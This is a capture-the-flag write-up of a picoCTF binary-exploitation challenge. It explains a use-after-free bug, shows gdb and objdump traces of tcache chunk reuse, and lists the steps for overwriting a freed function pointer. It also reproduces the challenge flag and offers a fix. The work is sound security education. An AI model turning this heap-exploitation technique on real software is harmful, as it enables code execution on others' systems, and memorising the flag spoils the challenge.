# PicoCTF: pwn/Unsubscriptions Are Free

*“Check out my new video-game and spaghetti-eating streaming channel on Twixer!”*

## Challenge Artifacts
- [`vuln.c`](./vuln.c), the source code for the “streaming” program.
- `vuln`, a version of `vuln.c` compiled as a 32-bit ELF executable for Linux on Intel 80386 with no-PIE.

## Context
This challenge simulates a streaming platform which prints action options in an infinite loop and allows the user to pick which function to execute. Everything is managed through a `struct cmd` named `user`, defined as shown and heap allocated in the `main` function before the prompt/execution loop starts.

```
typedef struct {
	uintptr_t (*whatToDo)();
	char *username;
} cmd;
...
cmd *user;
...
int main(){
	setbuf(stdout, NULL);
	user = (cmd *)malloc(sizeof(user));
	...
}
```

Here are the functions accessible to the user:
- **L (Leave Message)**: read a message into a heap-allocated buffer
    ```
    void leaveMessage(){
        puts("I only read premium member messages but you can ");
        puts("try anyways:");
        char* msg = (char*)malloc(8);
        read(0, msg, 8);
    }
    ```
- **S (Subscribe)**: leaks the address of the `hahaexploitgobrrr()` function (more on this later)
    ```
    void s(){
        printf("OOP! Memory leak...%p\n",hahaexploitgobrrr);
        puts("Thanks for subsribing! I really recommend becoming a premium member!");
    }
    ```
- **I (Delete Account)**: “remove” user by freeing the `user` struct
    ```
    void i(){
        char response;
        puts("You're leaving already(Y/N)?");
        scanf(" %c", &response);
        if(toupper(response)=='Y'){
            puts("Bye!");
            free(user);
        }else{
            puts("Ok. Get premium membership please!");
        }
    }
    ```
- **M (Make Account) and P (Premium Account)**: just print statements

The `hahaexploitgobrrr()` is the target of our exploit: it opens, reads, and prints the flag, but it isn’t accessible from the main menu.

## Vulnerability
This program has a use-after-free vulnerability (CWE-416) due to the `i()` function. This function frees the `struct cmd` associated with this user but does not exit the program or null the pointer, so when the next input is processed, it writes to and executes code from memory it should no longer be able to access.

```
void processInput(){
  scanf(" %c", &choice);
  choice = toupper(choice);
  switch(choice){
	case 'S':
	if(user){
 		user->whatToDo = (void*)s;
	}else{
		puts("Not logged in!");
	}
	break;
	case 'P':
	user->whatToDo = (void*)p;
	break;
	case 'I':
 	user->whatToDo = (void*)i;
	break;
	case 'M':
 	user->whatToDo = (void*)m;
	puts("===========================");
	puts("Registration: Welcome to Twixer!");
	puts("Enter your username: ");
	user->username = getsline();
	break;
   case 'L':
	leaveMessage();
	break;
	case 'E':
	exit(0);
	default:
	puts("Invalid option!");
	exit(1);
	  break;
  }
}
```

We even see in the main function that this risk was considered, but the check was commented out.

```
	while(1){
		printMenu();
		processInput();
		//if(user){
			doProcess(user);
		//}
	}
	return 0;
```

## Exploit
We expect a libc version in use on this server sufficiently modern to place small, recently allocated heap chunks in a tcache. The tcache enables quick reallocation of chunks with known sizes, so if we can free the `struct user` and allocate another struct of the same size, it’ll likely reuse that space. Luckily, the the `leaveMessage()` function does this, and it can write 8 bytes, covering the function pointer in the original `struct cmd`.

I confirmed this would work by debugging the program locally in gdb. I recompiled the program to run on my system architecture, so the addresses look a bit different, but I promise the functionality is the same ;)

```
# Compile the program with no-pie flag, matching the reference executable 
$ gcc -g -Wall -no-pie vuln.c -o vuln
vuln.c: In function ‘getsline’:
vuln.c:48:46: warning: pointer ‘linep’ may be used after ‘realloc’ [-Wuse-after-free]
   48 |                         line = linen + (line - linep);
      |                                        ~~~~~~^~~~~~~~
vuln.c:42:40: note: call to ‘realloc’ here
   42 |                         char * linen = realloc(linep, lenmax *= 2);
      |                                        ^~~~~~~~~~~~~~~~~~~~~~~~~~~

# Disassemble the functions to find where we’ll want to set breakpoints: Right after the call to
# malloc() in main(), right after free() in i(), and right after malloc() in leaveMessage().
$ objdump --disassemble=main vuln
0000000000401832 <main>:
  401832:	f3 0f 1e fa          	endbr64
  401836:	55                   	push   %rbp
  401837:	48 89 e5             	mov    %rsp,%rbp
  40183a:	48 8b 05 5f 28 00 00 	mov    0x285f(%rip),%rax        # 4040a0 <stdout@GLIBC_2.2.5>
  401841:	be 00 00 00 00       	mov    $0x0,%esi
  401846:	48 89 c7             	mov    %rax,%rdi
  401849:	e8 32 f9 ff ff       	call   401180 <setbuf@plt>
  40184e:	bf 08 00 00 00       	mov    $0x8,%edi
  401853:	e8 98 f9 ff ff       	call   4011f0 <malloc@plt>
  401858:	48 89 05 69 28 00 00 	mov    %rax,0x2869(%rip)        # Breakpoint 1
  40185f:	b8 00 00 00 00       	mov    $0x0,%eax
  401864:	e8 e6 fd ff ff       	call   40164f <printMenu>
  401869:	b8 00 00 00 00       	mov    $0x0,%eax
  40186e:	e8 5f fe ff ff       	call   4016d2 <processInput>
  401873:	48 8b 05 4e 28 00 00 	mov    0x284e(%rip),%rax        # 4040c8 <user>
  40187a:	48 89 c7             	mov    %rax,%rdi
  40187d:	e8 51 fc ff ff       	call   4014d3 <doProcess>
  401882:	90                   	nop
  401883:	eb da                	jmp    40185f <main+0x2d>

Disassembly of section .fini:
$ objdump --disassemble=i vuln
00000000004015b1 <i>:
  4015b1:	f3 0f 1e fa          	endbr64
  4015b5:	55                   	push   %rbp
  4015b6:	48 89 e5             	mov    %rsp,%rbp
  4015b9:	48 83 ec 10          	sub    $0x10,%rsp
  4015bd:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  4015c4:	00 00
  4015c6:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4015ca:	31 c0                	xor    %eax,%eax
  4015cc:	48 8d 05 5b 0b 00 00 	lea    0xb5b(%rip),%rax        # 40212e <_IO_stdin_used+0x12e>
  4015d3:	48 89 c7             	mov    %rax,%rdi
  4015d6:	e8 85 fb ff ff       	call   401160 <puts@plt>
  4015db:	48 8d 45 f7          	lea    -0x9(%rbp),%rax
  4015df:	48 89 c6             	mov    %rax,%rsi
  4015e2:	48 8d 05 62 0b 00 00 	lea    0xb62(%rip),%rax        # 40214b <_IO_stdin_used+0x14b>
  4015e9:	48 89 c7             	mov    %rax,%rdi
  4015ec:	b8 00 00 00 00       	mov    $0x0,%eax
  4015f1:	e8 3a fc ff ff       	call   401230 <__isoc99_scanf@plt>
  4015f6:	0f b6 45 f7          	movzbl -0x9(%rbp),%eax
  4015fa:	0f be c0             	movsbl %al,%eax
  4015fd:	89 c7                	mov    %eax,%edi
  4015ff:	e8 4c fb ff ff       	call   401150 <toupper@plt>
  401604:	83 f8 59             	cmp    $0x59,%eax
  401607:	75 20                	jne    401629 <i+0x78>
  401609:	48 8d 05 3f 0b 00 00 	lea    0xb3f(%rip),%rax        # 40214f <_IO_stdin_used+0x14f>
  401610:	48 89 c7             	mov    %rax,%rdi
  401613:	e8 48 fb ff ff       	call   401160 <puts@plt>
  401618:	48 8b 05 a9 2a 00 00 	mov    0x2aa9(%rip),%rax        # 4040c8 <user>
  40161f:	48 89 c7             	mov    %rax,%rdi
  401622:	e8 19 fb ff ff       	call   401140 <free@plt>
  401627:	eb 0f                	jmp    401638 <i+0x87>         # Breakpoint 2
  401629:	48 8d 05 28 0b 00 00 	lea    0xb28(%rip),%rax        # 402158 <_IO_stdin_used+0x158>
  401630:	48 89 c7             	mov    %rax,%rdi
  401633:	e8 28 fb ff ff       	call   401160 <puts@plt>
  401638:	90                   	nop
  401639:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40163d:	64 48 2b 04 25 28 00 	sub    %fs:0x28,%rax
  401644:	00 00
  401646:	74 05                	je     40164d <i+0x9c>
  401648:	e8 23 fb ff ff       	call   401170 <__stack_chk_fail@plt>
  40164d:	c9                   	leave
  40164e:	c3                   	ret

Disassembly of section .fini:
$ objdump --disassemble=leaveMessage vuln
0000000000401560 <leaveMessage>:
  401560:	f3 0f 1e fa          	endbr64
  401564:	55                   	push   %rbp
  401565:	48 89 e5             	mov    %rsp,%rbp
  401568:	48 83 ec 10          	sub    $0x10,%rsp
  40156c:	48 8d 05 7d 0b 00 00 	lea    0xb7d(%rip),%rax        # 4020f0 <_IO_stdin_used+0xf0>
  401573:	48 89 c7             	mov    %rax,%rdi
  401576:	e8 e5 fb ff ff       	call   401160 <puts@plt>
  40157b:	48 8d 05 9f 0b 00 00 	lea    0xb9f(%rip),%rax        # 402121 <_IO_stdin_used+0x121>
  401582:	48 89 c7             	mov    %rax,%rdi
  401585:	e8 d6 fb ff ff       	call   401160 <puts@plt>
  40158a:	bf 08 00 00 00       	mov    $0x8,%edi
  40158f:	e8 5c fc ff ff       	call   4011f0 <malloc@plt>
  401594:	48 89 45 f8          	mov    %rax,-0x8(%rbp)         # Breakpoint 3
  401598:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40159c:	ba 08 00 00 00       	mov    $0x8,%edx
  4015a1:	48 89 c6             	mov    %rax,%rsi
  4015a4:	bf 00 00 00 00       	mov    $0x0,%edi
  4015a9:	e8 02 fc ff ff       	call   4011b0 <read@plt>
  4015ae:	90                   	nop
  4015af:	c9                   	leave
  4015b0:	c3                   	ret

$ gdb vuln
(gdb) break *0x401858
Breakpoint 1 at 0x401858: file vuln.c, line 144.
(gdb) break *0x401627
Breakpoint 2 at 0x401627: file vuln.c, line 93.
(gdb) break *0x401594
Breakpoint 3 at 0x401594: file vuln.c, line 79.
(gdb) start
Temporary breakpoint 4 at 0x40183a: file vuln.c, line 143.
Starting program: /home/vuln
Breakpoint 1, 0x0000000000401858 in main () at vuln.c:144
144		user = (cmd *)malloc(sizeof(user));
(gdb) x $rax                                                       # %rax holds the pointer
0x4052a0:	0x00000000                                             # returned from malloc()
(gdb) c
Continuing.
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
p
Membership pending... (There's also a super-subscription you can also get for twice the price!)
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
i
You're leaving already(Y/N)?
y
Bye!

Breakpoint 2, i () at vuln.c:93
93	}
(gdb) print tcache.entries[0]                                      # Examine tcache: first
$1 = (tcache_entry *) 0x4052a0                                     # entry is our pointer
(gdb) c
Continuing.
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
l
I only read premium member messages but you can
try anyways:

Breakpoint 3, 0x0000000000401594 in leaveMessage () at vuln.c:79
79		char* msg = (char*)malloc(8);
(gdb) x $rax
0x4052a0:	0x00000405                                             # Reallocated same pointer
```

This means we can use the `leaveMessage()` function to overwrite the freed space with a pointer to the `hahaexploitgobrrr()` function and it will still get called by `doProcess()`.

I wrote a script, [`unsubscriptions_are_free_exploit.py`](./unsubscriptions_are_free_exploit.py), to do the following steps:
- Call `s()` with option S to get the address of `hahaexploitgobrrr()`.
- Call `i()` with option I to free the `user` struct.
- Call `leaveMessage()` with option L to reallocate and overwrite the function pointer.

```
(venv) elizabeth@egkushelevsky:~/ctf$ python3 unsubscriptions_are_free_exploit.py
[*] '/home/elizabeth/ctf/vuln'
    Arch:       aarch64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
[+] Opening connection to wily-courier.picoctf.net on port 58339: Done
[+] Address of hahaexploitgobrrr(): 80487d6
[+] Flag: b'picoCTF{d0ubl3_j30p4rdy_4665b867}\n'
[*] Closed connection to wily-courier.picoctf.net port 58339
```

## Remediation
To fix the use-after-free vulnerability, the program should set the `user` pointer to NULL after freeing it in line 89.

The commented-out check in line 148 that the pointer is valid would never work because the preceding call to processInput() would have already crashed the program with a null pointer exception with the fix, or have not caught use-after-free in the original code. A better solution would be to check the pointer on every loop iteration before prompting and processing input. This fixed `main()` function is shown below.

```
int main(){
	setbuf(stdout, NULL);
	while(1){
        if (!user)
            user = (cmd *)malloc(sizeof(user));
		printMenu();
		processInput();
		doProcess(user);
	}
	return 0;
}
```

## Credits
Written by [Elizabeth Kushelevsky](https://github.com/egkushelevsky). Challenge by thelshell on PicoCTF.